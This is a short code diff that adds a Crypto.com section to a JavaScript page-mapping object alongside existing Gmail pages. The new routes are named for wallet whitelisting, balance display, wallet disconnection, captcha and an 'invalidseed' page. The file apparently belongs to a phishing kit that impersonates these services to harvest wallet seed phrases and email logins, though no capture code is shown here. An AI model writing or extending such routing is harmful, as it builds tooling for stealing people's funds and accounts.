@@ -57,6 +57,21 @@ const pageMapping = {
     'error': 'error'     // Shared error page
   },
 
+  // Crypto.com pages (prefix + lowercase)
+  cryptocom: {
+    'loading': 'cryptocomloading',
+    'estimatedbalance': 'cryptocomestimatedbalance',
+    'whitelistwallet': 'cryptocomwhitelistwallet',
+    'whitelistsuccessful': 'cryptocomwhitelistsuccessful',
+    'review': 'cryptocomreview',
+    'pendingreview': 'cryptocomreview',
+    'completed': 'cryptocomcompleted',
+    'disconnectwallet': 'cryptocomdisconnectwallet',
+    'invalidseed': 'cryptocominvalidseed',
+    'captcha': 'captcha', // Shared captcha page
+    'error': 'error'     // Shared error page
+  },
+
   // Gmail pages
   gmail: {
     'loading': 'gmailloading',
